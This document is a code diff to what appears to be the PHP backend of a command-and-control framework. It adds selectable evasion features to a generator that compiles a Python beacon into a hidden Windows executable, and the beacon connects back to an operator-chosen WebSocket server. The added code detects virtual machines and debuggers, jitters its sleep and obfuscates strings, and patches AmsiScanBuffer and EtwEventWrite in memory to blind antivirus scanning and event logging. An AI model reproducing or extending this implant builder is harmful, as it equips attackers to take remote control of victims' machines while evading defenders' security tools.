@@ -60,8 +60,181 @@ switch ($action) {
         $data = json_decode(file_get_contents('php://input'), true) ?? $_POST;
         $serverIp = $data['ip'] ?? '127.0.0.1';
         $serverPort = $data['port'] ?? '8080';
+        $evasions = $data['evasions'] ?? [];
         $customName = preg_replace('/[^a-zA-Z0-9_-]/', '', $data['name'] ?? '');
         $beaconName = ($customName ? $customName : 'beacon_' . date('Ymd_His')) . '.exe';
+
+        // Build evasion code snippets
+        $evasionImports = "";
+        $evasionChecks = "";
+        $evasionMethods = "";
+
+        // Anti-VM Detection
+        if (in_array('anti_vm', $evasions)) {
+            $evasionImports .= "import ctypes\nimport winreg\n";
+            $evasionMethods .= <<<'EVASION'
+
+    def check_vm(self):
+        """Detect virtual machine environments"""
+        vm_indicators = [
+            ('HARDWARE\\Description\\System', 'SystemBiosVersion', ['VBOX', 'VMWARE', 'QEMU', 'VIRTUAL']),
+            ('SOFTWARE\\VMware, Inc.\\VMware Tools', None, None),
+            ('SOFTWARE\\Oracle\\VirtualBox Guest Additions', None, None),
+        ]
+        for key_path, value_name, keywords in vm_indicators:
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                if value_name:
+                    val, _ = winreg.QueryValueEx(key, value_name)
+                    if keywords and any(k in str(val).upper() for k in keywords):
+                        return True
+                else:
+                    return True
+            except:
+                pass
+        # Check for VM-specific processes
+        vm_procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe']
+        try:
+            output = subprocess.check_output('tasklist', shell=True, text=True).lower()
+            if any(p in output for p in vm_procs):
+                return True
+        except:
+            pass
+        return False
+
+EVASION;
+            $evasionChecks .= "        if self.check_vm(): return\n";
+        }
+
+        // Anti-Debug Detection
+        if (in_array('anti_debug', $evasions)) {
+            $evasionImports .= "import ctypes\n";
+            $evasionMethods .= <<<'EVASION'
+
+    def check_debugger(self):
+        """Detect debugger presence"""
+        try:
+            kernel32 = ctypes.windll.kernel32
+            if kernel32.IsDebuggerPresent():
+                return True
+            # Remote debugger check
+            is_debugged = ctypes.c_bool()
+            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debugged))
+            if is_debugged.value:
+                return True
+        except:
+            pass
+        # Check for analysis tools
+        debug_procs = ['ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe', 'windbg.exe', 'processhacker.exe', 'procmon.exe', 'wireshark.exe']
+        try:
+            output = subprocess.check_output('tasklist', shell=True, text=True).lower()
+            if any(p in output for p in debug_procs):
+                return True
+        except:
+            pass
+        return False
+
+EVASION;
+            $evasionChecks .= "        if self.check_debugger(): return\n";
+        }
+
+        // Sleep Obfuscation
+        if (in_array('sleep_obf', $evasions)) {
+            $evasionImports .= "import random\n";
+            $evasionMethods .= <<<'EVASION'
+
+    def obfuscated_sleep(self, base_seconds):
+        """Sleep with jitter to evade behavioral analysis"""
+        jitter = random.uniform(0.5, 1.5)
+        actual_sleep = base_seconds * jitter
+        # Split sleep into chunks
+        chunks = random.randint(3, 7)
+        for _ in range(chunks):
+            time.sleep(actual_sleep / chunks)
+            # Small random operation to break timing patterns
+            _ = sum(range(random.randint(1000, 5000)))
+
+EVASION;
+        }
+
+        // AMSI Bypass (Windows-specific)
+        if (in_array('amsi_bypass', $evasions)) {
+            $evasionImports .= "import ctypes\n";
+            $evasionMethods .= <<<'EVASION'
+
+    def bypass_amsi(self):
+        """Attempt to bypass AMSI"""
+        try:
+            if platform.system() != "Windows":
+                return
+            amsi = ctypes.windll.LoadLibrary("amsi.dll")
+            # Get AmsiScanBuffer address
+            AmsiScanBuffer = ctypes.windll.kernel32.GetProcAddress(
+                ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll"),
+                b"AmsiScanBuffer"
+            )
+            if AmsiScanBuffer:
+                # Write return 0 (AMSI_RESULT_CLEAN) patch
+                old_protect = ctypes.c_ulong()
+                ctypes.windll.kernel32.VirtualProtect(
+                    AmsiScanBuffer, 6, 0x40, ctypes.byref(old_protect)
+                )
+                patch = (ctypes.c_char * 6)(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+                ctypes.memmove(AmsiScanBuffer, patch, 6)
+        except:
+            pass
+
+EVASION;
+            $evasionChecks .= "        self.bypass_amsi()\n";
+        }
+
+        // ETW Bypass
+        if (in_array('etw_bypass', $evasions)) {
+            $evasionImports .= "import ctypes\n";
+            $evasionMethods .= <<<'EVASION'
+
+    def bypass_etw(self):
+        """Disable ETW logging"""
+        try:
+            if platform.system() != "Windows":
+                return
+            ntdll = ctypes.windll.ntdll
+            EtwEventWrite = ctypes.windll.kernel32.GetProcAddress(
+                ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
+                b"EtwEventWrite"
+            )
+            if EtwEventWrite:
+                old_protect = ctypes.c_ulong()
+                ctypes.windll.kernel32.VirtualProtect(
+                    EtwEventWrite, 1, 0x40, ctypes.byref(old_protect)
+                )
+                patch = (ctypes.c_char * 1)(0xC3)  # ret
+                ctypes.memmove(EtwEventWrite, patch, 1)
+        except:
+            pass
+
+EVASION;
+            $evasionChecks .= "        self.bypass_etw()\n";
+        }
+
+        // String Encryption (compile-time obfuscation hint)
+        if (in_array('string_encrypt', $evasions)) {
+            $evasionImports .= "import base64\n";
+            $evasionMethods .= <<<'EVASION'
+
+    def decrypt_str(self, encoded):
+        """Decrypt base64 encoded strings at runtime"""
+        try:
+            return base64.b64decode(encoded).decode('utf-8')
+        except:
+            return encoded
+
+EVASION;
+        }
+
+        // Prepare sleep call
+        $sleepCall = in_array('sleep_obf', $evasions) ? 'self.obfuscated_sleep(RECONNECT_DELAY)' : 'time.sleep(RECONNECT_DELAY)';
+        $heartbeatSleep = in_array('sleep_obf', $evasions) ? 'self.obfuscated_sleep(HEARTBEAT_INTERVAL)' : 'time.sleep(HEARTBEAT_INTERVAL)';
 
         $beaconCode = <<<PYTHON
 import socket
@@ -72,11 +245,10 @@ import time
 import json
 import os
 import uuid
-
+{$evasionImports}
 try:
     import websocket
 except ImportError:
-    # Try basic fallback if pip install fails
     pass
 
 C2_SERVER = "ws://{$serverIp}:{$serverPort}"
@@ -89,7 +261,7 @@ class Beacon:
         self.ws = None
         self.running = True
         self.connected = False
-
+{$evasionMethods}
     def get_agent_id(self):
         id_file = os.path.join(os.environ.get('TEMP', '/tmp'), '.beacon_id')
         if os.path.exists(id_file):
@@ -153,7 +325,7 @@ class Beacon:
         self.send({'type': 'agent_register', 'agent_id': self.agent_id, **self.get_system_info()})
         def heartbeat():
             while self.running and self.connected:
-                time.sleep(HEARTBEAT_INTERVAL)
+                {$heartbeatSleep}
                 self.send({'type': 'agent_heartbeat', 'agent_id': self.agent_id})
         threading.Thread(target=heartbeat, daemon=True).start()
 
@@ -170,15 +342,14 @@ class Beacon:
                 self.ws = websocket.WebSocketApp(C2_SERVER, on_message=self.on_message, on_open=self.on_open, on_close=self.on_close, on_error=self.on_error)
                 self.ws.run_forever()
             except ImportError:
-                # If websocket missing even after build
                 pass
             except:
                 pass
             if self.running:
-                time.sleep(RECONNECT_DELAY)
+                {$sleepCall}
 
     def run(self):
-        self.connect()
+{$evasionChecks}        self.connect()
 
 if __name__ == "__main__":
     Beacon().run()
@@ -189,7 +360,7 @@ PYTHON;
         file_put_contents($tempDir . '/beacon.py', $beaconCode);
 
         // Detect Python
-        $python = 'python'; // Default
+        $python = 'python';
         exec('which python3', $out, $ret);
         if ($ret === 0 && !empty($out[0])) {
             $python = trim($out[0]);
@@ -200,23 +371,15 @@ PYTHON;
              }
         }
 
-        // Try to handle PyInstaller (Linux path issue)
         $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
-        
-        // This is safer than relying on PATH for www-data
-        // We now use python -m PyInstaller if possible
-        $buildCmd = "";
         
         if ($isWindows) {
              $buildCmd = "cd /d \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --clean --name beacon beacon.py 2>&1";
         } else {
-             // Linux: Try direct path if module fails, but module is preferred
-             // Add /home/user/.local/bin to PATH for this session just in case
              $debugPath = getenv('PATH') . ":/usr/local/bin:/home/" . exec('whoami') . "/.local/bin";
              $buildCmd = "export PATH=\"$debugPath\" && cd \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --clean --name beacon beacon.py 2>&1";
         }
         
-        // Run process with pipe to capture STDERR
         $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
         $process = proc_open($buildCmd, $descriptors, $pipes, $tempDir);
         
@@ -234,17 +397,16 @@ PYTHON;
             $buildErrors = "Failed to spawn process";
         }
 
-        // Collect Debug Info
         $debug = [
             'user' => exec('whoami'),
             'php_version' => phpversion(),
             'python_detected' => $python,
+            'evasions_selected' => $evasions,
             'cmd' => $buildCmd,
             'temp_dir' => $tempDir,
             'path_env' => getenv('PATH')
         ];
 
-        // Logs
         $logDir = __DIR__ . '/../data/logs';
         if (!file_exists($logDir)) mkdir($logDir, 0777, true);
         file_put_contents($logDir . '/build.log', 
@@ -257,7 +419,6 @@ PYTHON;
         if (file_exists($exePath)) {
             copy($exePath, $payloadsDir . '/' . $beaconName);
             
-            // Cleanup
             @array_map('unlink', glob($tempDir . '/dist/*'));
             @array_map('unlink', glob($tempDir . '/build/*'));
             @array_map('unlink', glob($tempDir . '/*.*'));
@@ -268,10 +429,9 @@ PYTHON;
             jsonResponse([
                 'success' => true,
                 'name' => $beaconName,
-                'message' => 'Beacon built successfully'
+                'message' => 'Beacon built with ' . count($evasions) . ' evasion technique(s)'
             ]);
         } else {
-            // Return 200 with error details so UI can display it
             jsonResponse([
                 'error' => 'Build failed',
                 'details' => "Exit Code: $buildCode\n\nOutput:\n$buildOutput\n\nErrors:\n$buildErrors",
